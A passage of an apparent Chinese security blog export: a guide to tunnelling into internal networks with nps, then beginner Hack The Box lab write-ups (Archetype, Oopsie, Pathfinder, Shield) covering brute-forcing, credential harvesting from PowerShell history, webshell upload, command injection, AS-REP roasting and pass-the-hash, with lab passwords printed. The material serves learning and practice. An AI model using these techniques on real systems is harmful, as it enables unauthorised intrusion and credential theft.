<p>下次继续写是啥时候呢（</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>使用nps</title>
    <url>//nps.html</url>
    <content><![CDATA[<p>使用<code>nps</code>工具进行内网渗透</p>
<a id="more"></a>



<h2 id="nps下载"><a href="#nps下载" class="headerlink" title="nps下载"></a>nps下载</h2><p><a href="https://github.com/ehang-io/nps">github文档</a></p>
<p><a href="https://github.com/ehang-io/nps/releases">github release</a></p>
<p>根据自己的环境下载对应的版本，这里使用<code>linux_amd64_client</code>和<code>linux_amd64_server</code>做例子</p>
<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><p>将<code>linux_amd64_server.tar.gz</code>上传至公网机(<code>vps</code>)，</p>
<p>使用<code>tar -xvf linux_amd64_server.tar.gz</code>解压，解压后文件如下</p>
<img src="nps/image-20200819150524939.png" alt="image-20200819150524939" style="zoom:50%;" />

<p>运行<code>./nps install</code>命令，安装工具</p>
<img src="nps/image-20200819151325928.png" alt="image-20200819151325928" style="zoom:50%;" />

<p>需要（至少）开启这几个端口</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><font color=red>一定要改密码</font></p>
<p>安装完成之后打开配置文件</p>
<p><code>vim /etc/nps/conf/nps.conf</code></p>
<img src="nps/image-20200819150819441.png" alt="image-20200819150819441" style="zoom:50%;" />

<p>其中</p>
<ul>
<li><code>web_username</code>是web端登录的用户名，在之后会用到</li>
<li><code>web_password</code>是web端登录的密码</li>
<li><code>web_port</code>是web服务运行的端口号</li>
</ul>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>访问<code>ip:web_port</code>进入web端</p>
<img src="nps/image-20200819151101879.png" alt="image-20200819151101879" style="zoom:50%;" />

<p>输入正确的<code>username</code>和<code>password</code>之后进入界面</p>
<h3 id="新建客户端"><a href="#新建客户端" class="headerlink" title="新建客户端"></a>新建客户端</h3><p>选择**<code>客户端</code> -&gt; <code>新建</code>**</p>
<img src="nps/image-20200819151436822.png" alt="image-20200819151436822" style="zoom:50%;" />

<ul>
<li><code>备注</code>：写给自己看的注释（</li>
<li><code>认证用户名、密码</code>：攻击机使用这个用户名、密码接入nps服务端，通过隧道和受害机相连</li>
</ul>
<h3 id="新建隧道"><a href="#新建隧道" class="headerlink" title="新建隧道"></a>新建隧道</h3><p>新建完客户端之后点击<code>隧道</code></p>
<img src="nps/image-20200819152251731.png" alt="image-20200819152251731" style="zoom:50%;" />

<p><code>新建</code></p>
<img src="nps/image-20200819152339494.png" alt="image-20200819152339494" style="zoom:50%;" />



<h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>在新建完客户端之后</p>
<img src="nps/image-20200819151745081.png" alt="image-20200819151745081" style="zoom:50%;" />

<p>点击**<code>+</code>**</p>
<img src="nps/image-20200819151827068.png" alt="image-20200819151827068" style="zoom:50%;" />

<p>得到这一串指令</p>
<p>将<code>linux_amd64_client.tar.gz</code>解压，得到一个<code>npc</code></p>
<p>将npc上传至受害机</p>
<p><code>chmod +x npc</code>给予运行权限，然后运行上面服务端给出的指令</p>
<p>服务端刷新之后可以看到状态变为<code>在线</code></p>
<img src="nps/image-20200819152123248.png" alt="image-20200819152123248" style="zoom:50%;" />



<h2 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h2><p>这里使用<code>kali linux</code>示例</p>
<p>编辑<code>/etc/proxychain.conf</code>文件，注释掉最后一句</p>
<img src="nps/image-20200819152536104.png" alt="image-20200819152536104" style="zoom:50%;" />

<p>添加一句<code>socks5 ip port username password</code></p>
<p>其中，<code>username</code> 和 <code>password</code> 是新建客户端的时候使用的那个</p>
<p>连接上去之后使用</p>
<p><code>proxychains</code> + <code>[shell](例如 nmap 172.12.0.3)</code></p>
<p>这里举例一个</p>
<p><code>proxychains firefox</code></p>
<img src="nps/image-20200819155154169.png" alt="image-20200819155154169" style="zoom:50%;" />

<p>可以访问到</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>box:Archetype</title>
    <url>//box_Archetype.html</url>
    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
<a id="more"></a>

<h1 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h1><ul>
<li>  靶机： <code>10.10.10.27</code></li>
<li>  攻击机：<code>10.10.14.34</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hack_the_box]</span><br><span class="line">└─$ nmap 10.10.10.27 -A           </span><br><span class="line">Nmap scan report for 10.10.10.27</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|   DNS_Domain_Name: Archetype</span><br><span class="line">|   DNS_Computer_Name: Archetype</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-02-24T22:44:23</span><br><span class="line">|_Not valid after:  2051-02-24T22:44:23</span><br><span class="line">|_ssl-date: 2021-02-25T08:37:30+00:00; +1h20m38s from scanner time.</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h56m37s, deviation: 3h34m40s, median: 1h20m37s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.27:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-02-25T00:36:53-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-02-25T08:36:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.65 seconds</span><br></pre></td></tr></table></figure>



<p>扫描结果说明了：</p>
<ol>
<li> 目标是<code>Windows Server 2019</code></li>
<li> smb可以使用guest用户登录</li>
<li> 目标使用了<code>mssql</code></li>
</ol>
<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>以guest用户登录目标机器</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164220367.png" alt="image-20210225164220367"></p>
<p>发现目标下存在backups文件夹可以访问。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164154992.png" alt="image-20210225164154992"></p>
<p>查看一下下载下来的文件</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164413390.png" alt="image-20210225164413390"></p>
<p>里面写到了mssql的用户名和密码</p>
<p>不用猜都知道肯定是要用mssql执行系统命令拿shell</p>
<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><p>由于对mssql缺乏认知和了解，不知道怎么连接上去，就尝试了一下<code>msfconsole</code></p>
<p>看到有一个<code>mssql_exec</code>，就决定是你了小火龙</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164550486.png" alt="image-20210225164550486"></p>
<p>设置参数，这里有一个注意点：</p>
<blockquote>
<p>  SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证，此处的参数值应该是操作系统身份验证方式，其前半部分ARCHETYPE是靶机的主机名，后半部分sql_svc是具有数据库登录权限的操作系统用户名。</p>
</blockquote>
<p>卡了我好久</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164644591.png" alt="image-20210225164644591"></p>
<p>所以要把<code>use_windows_authent</code>设置为<code>true</code>，并且按照他的要求设置<code>domain</code>(图上未标出)，然后<code>exploit</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164957307.png" alt="image-20210225164957307"></p>
<p>可以看到<code>whoami</code>命令已经执行成功了</p>
<p>该用户的flag在<code>C:\Users\sql_svc\Desktop\user.txt</code>，使用<code>type</code> 命令获取</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165118035.png" alt="image-20210225165118035"></p>
<p>这就是第一个flag</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>第一次遇到Windows，要提权emmm，不知道该怎么办。</p>
<p>查了查wp</p>
<blockquote>
<p>  可以发现sql_svc同时是操作系统普通用户、数据库和数据库服务用户，值得去检查频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件：</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165415264.png" alt="image-20210225165415264"></p>
<p>然后就懂了，这里暴露出来的肯定是用户名和密码</p>
<p>但是这也没开3389，咋登录windows呢</p>
<p>wp上给了一个工具<code>psexec.py</code></p>
<p>登录上去，拿到最后的flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165607949.png" alt="image-20210225165607949"></p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
<li>  对于Windows的渗透，技术不到位，有很多情况不知道解决方案（mssql，提权等）</li>
<li>  太过于依赖工具和脚本，对原理性的知识了解不深入</li>
</ul>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hack the box</category>
        <category>start point</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>exploit</tag>
        <tag>hack the box</tag>
      </tags>
  </entry>
  <entry>
    <title>box:Oopsie</title>
    <url>//box_Oopsie.html</url>
    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
<a id="more"></a>

<h1 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h1><ul>
<li>  靶机： <code>10.10.10.28</code></li>
<li>  攻击机：<code>10.10.14.88</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 10.10.10.28 -A</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 19:19 EST</span><br><span class="line">Nmap scan report for 10.10.10.28</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)</span><br><span class="line">|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)</span><br><span class="line">|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Welcome</span><br></pre></td></tr></table></figure>

<p>虽然应该是爆破不出来的，但是看到22端口就习惯性的爆破一下吧，万一就进去了呢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>



<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>访问一下web服务</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302082954260.png" alt="image-20210302082954260"></p>
<p>啥也没有，所有的链接都跳转不了。</p>
<h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><p>接下来的突破口有两种：</p>
<ul>
<li>  扫目录，遇到web站点扫一下目录，运气好的话能扫出好多有用的东西。真实环境中要注意线程数和访问速度，太快的话遇到waf/cdn会被ban。这个过程可以使用<code>dirsearch</code>——<a href="https://github.com/maurosoria/dirsearch">github地址</a></li>
<li>  看前端源代码，js文件中通常会暴露很多路由和接口信息，通过查看js文件，可以收集子域名和目录信息。这个过程可以使用<code>JSFinder</code>来做——<a href="https://github.com/Threezh1/JSFinder">github地址</a></li>
</ul>
<h3 id="登录窗口"><a href="#登录窗口" class="headerlink" title="登录窗口"></a>登录窗口</h3><p>这里使用第二种方法，查看网页源代码之后，在最下面发现了：</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302083525395.png" alt="image-20210302083525395"></p>
<p>访问<code>/cdn-cgi/login</code>:</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302083603915.png" alt="image-20210302083603915"></p>
<p>对于登录框，接下来要么是sql注入，要么是爆破弱密码（我是真没想到是上一道题的密码啊）</p>
<ul>
<li>  如果是sql注入，可以尝试万能密码<code>&#39;||1||&#39;</code>，或者直接使用sqlmap跑一下</li>
<li>  如果是弱密码，burp抓包后，使用爆破模块即可</li>
</ul>
<p>密码是上题得到的<code>MEGACORP_4dm1n!!</code></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>登录之后，选项卡中有一个<code>upload</code>，但是需要super admin权限</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084039939.png" alt="image-20210302084039939"></p>
<p>试试其他的功能，第一个<code>Account</code>，可以看到自己的<code>Access ID</code>，是通过传入<code>id</code>变量的形式，并且cookie保存的信息就是这个<code>Access ID</code>。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084521198.png" alt="image-20210302084521198"></p>
<p>尝试sql注入或者越权访问</p>
<ul>
<li><p>sql注入：</p>
<ul>
<li>  直接使用sqlmap跑一下，显而易见的，失败了。</li>
<li>  手动加入 单引号、双引号、分号等特殊字符，没有报错信息。</li>
</ul>
</li>
<li><p>越权访问：</p>
<ul>
<li><p>修改<code>id</code>变量的值，id为4的时候出现了另一个用户</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084649936.png" alt="image-20210302084649936"></p>
<p>  但是他不是super admin，继续。</p>
<p>  直到<code>id=30</code>的时候，super admin的<code>Access ID</code>出来了</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084736069.png" alt="image-20210302084736069"></p>
<p>  修改自己的cookie为这个值，访问<code>uploads</code>选项卡</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084933102.png" alt="image-20210302084933102"></p>
<p>  访问到了<code>uploads</code>，越权成功。</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085019626.png" alt="image-20210302085019626"></p>
</li>
</ul>
</li>
</ul>
<p>接下来的文件上传比较简单，没有保护措施</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085233423.png" alt="image-20210302085233423"></p>
<p>但是上传的路径不知道</p>
<ul>
<li>  靠猜，通常都是<code>/upload</code> 或 <code>/uploads</code> 或 <code>/uploadfiles</code>这种的样子</li>
<li>  目录扫描的时候扫出类似的目录</li>
</ul>
<p>咱这里用猜的，访问<code>/uploads/shell.php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085426082.png" alt="image-20210302085426082"></p>
<p><a href="https://github.com/AntSwordProject/AntSword-Loader">蚁剑</a>连上webshell</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085731375.png" alt="image-20210302085731375"></p>
<p>得到第一个flag，在<code>/home/robert/user.txt</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085857872.png" alt="image-20210302085857872"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="robert"><a href="#robert" class="headerlink" title="robert"></a>robert</h3><p>在<code>/var/www/html/login/db.php</code>中发现密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302091843922.png" alt="image-20210302091843922"></p>
<p>ssh连接</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302092355879.png" alt="image-20210302092355879"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>Linux提权的若干方法：</p>
<ul>
<li><p>setuid，具有s权限的文件在运行时如果代码中调用了<code>setuid</code>函数，那么会改变自己的uid，如果这个程序能打开一个shell，那么可以得到setuid对象的权限</p>
<ul>
<li><p>使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302090516559.png" alt="image-20210302090516559"></p>
</li>
</ul>
</li>
<li><p>  sudo免密运行，大致原理同上</p>
</li>
<li><p>  docker组用户通过docker提权，通过挂载驱动的形式提权</p>
</li>
<li><p>  内核漏洞，这个就不多说了。</p>
</li>
<li><p>  计划任务，假设root用户每分钟会运行一次<code>/tmp/a</code>，并且该文件可写，那就可以改变文件内容，再次运行就是任意代码执行。</p>
</li>
</ul>
<p>上面找到的<code>bugtracker</code>可能是突破口，下载该文件，是一个Linux可执行文件，简单的分析可以直接使用<code>strings</code>，或者ida反编译</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302090926036.png" alt="image-20210302090926036"></p>
<p>这里可以有两种利用方法</p>
<ul>
<li><p>劫持cat</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302092558352.png" alt="image-20210302092558352"></p>
<p>  通过环境变量的劫持，达到执行命令的效果</p>
</li>
<li><p>命令注入</p>
<p>  v6变量直接拼接在<code>cat /root/report</code>之后，运行在system函数中，存在命令注入</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093012476.png" alt="image-20210302093012476"></p>
<p>  但是不能用空格，因为%s遇到空格就会停止，找个空格替代品<code>$&#123;IFS&#125;</code>就行</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093359049.png" alt="image-20210302093359049"></p>
</li>
</ul>
<p>flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093524570.png" alt="image-20210302093524570"></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hack the box</category>
        <category>start point</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>hack the box</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>box:Pathfinder</title>
    <url>//box_Pathfinder.html</url>
    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
<p>萌新第一次接触的域渗透</p>
<a id="more"></a>



<h1 id="Pathfinder"><a href="#Pathfinder" class="headerlink" title="Pathfinder"></a>Pathfinder</h1><ul>
<li>  靶机： <code>10.10.10.30</code></li>
<li>  攻击机：<code>10.10.14.88</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap 10.10.10.30 -A                                                                                                                                                    4 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 01:11 EST</span><br><span class="line">Nmap scan report for 10.10.10.30</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE           VERSION</span><br><span class="line">53/tcp   open  domain            Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2021-03-02 14:21:46Z)</span><br><span class="line">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  globalcatLDAPssl?</span><br></pre></td></tr></table></figure>

<p>nmap扫描出了Kerberos、LDAP等，大致可以断定为是一台KDC</p>
<p><strong>由于萌新初次接触域渗透，本机子基本是照着wp复现一遍，学习一下工具的使用和原理什么的。</strong></p>
<h2 id="先写写自己做了啥"><a href="#先写写自己做了啥" class="headerlink" title="先写写自己做了啥"></a>先写写自己做了啥</h2><p>大多都是无用功</p>
<h3 id="尝试使用impacket"><a href="#尝试使用impacket" class="headerlink" title="尝试使用impacket"></a>尝试使用impacket</h3><p><a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries">https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries</a></p>
<ul>
<li><p><code>psexec</code></p>
<p>  久仰大名，但是使用需要目标域成员能访问<code>admin$</code>共享，即域控的<code>administrator</code>组，一般域成员使用不了。上个靶机中得到的<strong>sandra</strong>用户只是一个普通的域成员，无权使用</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142632173.png" alt="image-20210302142632173"></p>
</li>
<li><p><code>wmiexec</code></p>
<p>  也是久仰大名了，总觉得他俩差不多，在这个环境中也用不了，没有权限（🤷‍♂️），悲</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/F9658923E26596D4D4B082154CFDAE3D.jpg" alt="F9658923E26596D4D4B082154CFDAE3D"></p>
</li>
<li><p><code>smbexec</code></p>
<p>  这几个的参数都差不多你敢信，万一人家就是一样的代码呢（滑稽）</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/C3A4C2056AEDF963BA1F9A0A975764C1.jpg" alt="C3A4C2056AEDF963BA1F9A0A975764C1"></p>
</li>
<li><p><code>smbclient</code></p>
<p>  这个能登录，但是只能读文件啊喂</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142751947.png" alt="image-20210302142751947"></p>
</li>
</ul>
<h3 id="尝试通过上一台机子连接DC"><a href="#尝试通过上一台机子连接DC" class="headerlink" title="尝试通过上一台机子连接DC"></a>尝试通过上一台机子连接DC</h3><p>在上一台机子的cs上加入一个target</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142903239.png" alt="image-20210302142903239"></p>
<p>然后右键-&gt;jump</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302143007960.png" alt="image-20210302143007960"></p>
<p>使用sandra的凭证登录，都不行</p>
<p>获取域内用户hash，失败</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302144033652.png" alt="image-20210302144033652"></p>
<h2 id="在写一下复现了啥"><a href="#在写一下复现了啥" class="headerlink" title="在写一下复现了啥"></a>在写一下复现了啥</h2><ul>
<li><p>  使用<strong>BloodHound</strong>工具，知道了存在<code>svc_bes</code>用户，并且该用户是域管理员</p>
</li>
<li><p>使用<code>GetNPUsers</code>，得到了<code>svc_bes</code>用户的TGT，并使用john解密</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302144708936.png" alt="image-20210302144708936"></p>
<p>  <code>Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)</code></p>
</li>
<li><p>  使用<code>evil-winrm</code>登录，得到命令执行权限，cs上线</p>
</li>
<li><p>提权</p>
<ul>
<li>  使用<code>secretsdump_linux_x86_64</code>，得到<code>administrator</code>用户的hash值</li>
<li>  <code>psexec</code>使用<code>pass the hash</code>攻击</li>
</ul>
</li>
</ul>
<h2 id="最后写写自己又干了啥"><a href="#最后写写自己又干了啥" class="headerlink" title="最后写写自己又干了啥"></a>最后写写自己又干了啥</h2><p>在拿到<strong>svc_bes</strong>用户cs上线之后，使用<strong>梼杌</strong>的获取域内全部用户的hash模块</p>
<img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302151354457.png" alt="image-20210302151354457" style="zoom:50%;" />

<p>得到了<strong>administrator</strong>用户的hash值</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302150620403.png" alt="image-20210302150620403"></p>
<p>在用cs自带的<code>psexec</code>使用<code>pass the hash</code>攻击</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302151325897.png" alt="image-20210302151325897"></p>
<p>拿到的权限就是system</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302150933120.png" alt="image-20210302150933120"></p>
<p>为什么直接是system权限呢</p>
<blockquote>
<p>  psexec 会启动服务，服务（service）的权限是system </p>
<p>  你看看psexec会操作的详细步骤</p>
<p>  ​                                                                                                                ——lhaihai学长</p>
</blockquote>
<p>提上日程（新建选项卡）</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>小萌新略微学习学习了cs的使用方法，对于<code>blood-hound</code>这个工具，还是一脸懵逼</p>
<p>小萌新在脚本小子的路上越走越远</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hack the box</category>
        <category>start point</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>exploit</tag>
        <tag>hack the box</tag>
      </tags>
  </entry>
  <entry>
    <title>box:Shield</title>
    <url>//box_Shield.html</url>
    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
<a id="more"></a>



<h1 id="Shield"><a href="#Shield" class="headerlink" title="Shield"></a>Shield</h1><ul>
<li>  靶机： <code>10.10.10.29</code></li>
<li>  攻击机：<code>10.10.14.88</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap 10.10.10.29 -A                                                                                                                                                    </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 21:49 EST</span><br><span class="line">Nmap scan report for 10.10.10.29</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br></pre></td></tr></table></figure>

<p>3306 mysql不允许远程登录，无法爆破，入口点只有80端口</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>上来就是一个iis，很快啊</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105122136.png" alt="image-20210302105122136"></p>
<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>我一个<code>dirsearch</code>，都找到了啊</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105308625.png" alt="image-20210302105308625"></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>祭出<code>wordpress</code>的渗透神器<code>wpscan</code>，找用户名，并爆破</p>
<p><code>wpscan --url http://10.10.10.29/wordpress/ --passwords /usr/share/wordlist/rockyou.txt</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105646571.png" alt="image-20210302105646571"></p>
<p>转念一想，前几个都有联动，这个会没有？拿出上道题的密码<code>P@s5w0rd!</code></p>
<p>好家伙，进了后台</p>
